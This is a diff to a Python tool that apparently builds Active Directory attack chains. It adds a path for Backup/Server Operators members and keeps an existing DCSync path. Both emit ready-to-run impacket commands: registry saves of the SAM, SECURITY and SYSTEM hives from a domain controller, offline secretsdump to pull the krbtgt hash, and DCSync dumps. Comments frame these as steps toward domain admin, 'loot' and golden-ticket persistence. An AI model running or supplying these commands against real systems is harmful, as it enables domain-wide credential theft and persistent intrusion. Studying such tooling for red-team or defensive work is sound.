@@ -967,20 +967,48 @@ def run(report, store, ui=None):
             _auth_target = (f"'{_dom_ac}/{ulc}'@{_dc_ac}" if _is_hash_ac
                             else f"'{_dom_ac}/{ulc}:{pw}'@{_dc_ac}")
             _summary_val = f"NT hash for {ulc}" if _is_hash_ac else f"{ulc}:{pw}"
-            chains.append(Chain("R-ADMIN-CRED", "already-DA cred",
-                f"{_summary_val} - tier-0 candidate{via_note}",
-                crit=10, conf=0.95, ready=1.5, prox=1.0,         # score 14.25
-                commands=[
-                    f"# BloodHound flags {ulc} as tier-0{via_note}",
-                    # iter-54: two variants - full dump for immediate loot,
-                    # or targeted krbtgt-only for fast R-GOLDEN cascade.
-                    f"impacket-secretsdump{_hash_flag} {_auth_target}",
-                    f"# or targeted (just krbtgt for R-GOLDEN):",
-                    f"impacket-secretsdump -just-dc-user krbtgt{_hash_flag} "
-                    f"{_auth_target}",
-                    f"# if either works you have DA - proceed to R-GOLDEN "
-                    f"for persistence",
-                ], src=best_src, line=best_line))
+            # iter-115: Backup/Server Operators do NOT hold DRSUAPI GetChanges
+            # rights, so the standard secretsdump DCSync form fails. What they
+            # DO have is SeBackupPrivilege honored through remote-registry, so
+            # they can save HKLM\SAM+SECURITY+SYSTEM hives off the DC and
+            # secretsdump those OFFLINE (LOCAL mode) - which recovers krbtgt
+            # via the SECURITY hive's LSA secrets. Route BOp/SOp members
+            # through the registry-save pattern instead of DCSync.
+            _via_low = via.lower() if via else ""
+            _is_bop_sop = _via_low in ("backup operators", "server operators")
+            if _is_bop_sop:
+                chains.append(Chain("R-ADMIN-CRED", "backup/server op -> hive dump",
+                    f"{_summary_val} - {via.title()} member (no DCSync, use hive save)",
+                    crit=10, conf=0.95, ready=1.4, prox=1.0,     # score 13.3
+                    commands=[
+                        f"# {via.title()} hold SeBackupPrivilege remotely; "
+                        f"they cannot DCSync but can save SAM/SECURITY/SYSTEM",
+                        f"impacket-reg{_hash_flag} {_auth_target} save "
+                        f"-keyName 'HKLM\\SAM'      -o /tmp/SAM.save",
+                        f"impacket-reg{_hash_flag} {_auth_target} save "
+                        f"-keyName 'HKLM\\SECURITY' -o /tmp/SECURITY.save",
+                        f"impacket-reg{_hash_flag} {_auth_target} save "
+                        f"-keyName 'HKLM\\SYSTEM'   -o /tmp/SYSTEM.save",
+                        f"impacket-secretsdump -sam /tmp/SAM.save "
+                        f"-security /tmp/SECURITY.save "
+                        f"-system /tmp/SYSTEM.save LOCAL   "
+                        f"# extracts krbtgt from LSA secrets -> R-GOLDEN",
+                    ], src=best_src, line=best_line))
+            else:
+                chains.append(Chain("R-ADMIN-CRED", "already-DA cred",
+                    f"{_summary_val} - tier-0 candidate{via_note}",
+                    crit=10, conf=0.95, ready=1.5, prox=1.0,     # score 14.25
+                    commands=[
+                        f"# BloodHound flags {ulc} as tier-0{via_note}",
+                        # iter-54: two variants - full dump for immediate loot,
+                        # or targeted krbtgt-only for fast R-GOLDEN cascade.
+                        f"impacket-secretsdump{_hash_flag} {_auth_target}",
+                        f"# or targeted (just krbtgt for R-GOLDEN):",
+                        f"impacket-secretsdump -just-dc-user krbtgt{_hash_flag} "
+                        f"{_auth_target}",
+                        f"# if either works you have DA - proceed to R-GOLDEN "
+                        f"for persistence",
+                    ], src=best_src, line=best_line))
 
     # iter-35: R-GOLDEN - krbtgt NT hash was recovered (from NTDS DCSync or
     # ntds.dit + SYSTEM). One command forges an Administrator TGT for the
